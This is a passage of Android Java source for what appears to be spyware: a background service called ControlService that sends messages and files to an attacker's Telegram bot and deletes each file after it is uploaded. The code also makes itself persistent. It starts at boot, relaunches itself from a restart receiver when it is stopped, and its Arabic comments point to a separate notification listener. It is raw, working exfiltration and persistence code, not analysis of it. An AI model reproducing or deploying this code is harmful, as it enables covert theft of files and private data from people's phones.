        }
    }
    
    private void sendToTelegram(String title, String message) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + 
                "/sendMessage?chat_id=" + CHAT_ID + 
                "&text=" + URLEncoder.encode("🔴 " + title + "\n\n" + message, "UTF-8");
            
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
            
        } catch (Exception e) {
            Log.e("V8", "Send error", e);
        }
    }
    
    private void sendFileToTelegram(String caption, String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() > 50 * 1024 * 1024) return;
            
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            
            DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
            
            // chat_id
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            outputStream.writeBytes(CHAT_ID + "\r\n");
            
            // caption
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            outputStream.writeBytes("🔴 " + caption + "\r\n");
            
            // document
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
            outputStream.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            
            outputStream.writeBytes("\r\n--" + boundary + "--\r\n");
            outputStream.flush();
            outputStream.close();
            
            conn.getResponseCode();
            conn.disconnect();
            
            file.delete();
            
        } catch (Exception e) {
            Log.e("V8", "Send file error", e);
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        // إعادة تشغيل الخدمة إذا تم إيقافها
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, RestartReceiver.class);
        sendBroadcast(broadcastIntent);
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }
}

// ========== مستقبل الإقلاع ==========
class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Intent serviceIntent = new Intent(context, ControlService.class);
            context.startService(serviceIntent);
        }
    }
}

// ========== مستقبل إعادة التشغيل ==========
class RestartReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if ("restartservice".equals(intent.getAction())) {
            Intent serviceIntent = new Intent(context, ControlService.class);
            context.startService(serviceIntent);
        }
    }
}

// ========== مستقبل الإشعارات (يضاف في AndroidManifest.xml) ==========
// هذا الكلاس يكون منفصل في ملف NotificationService.java
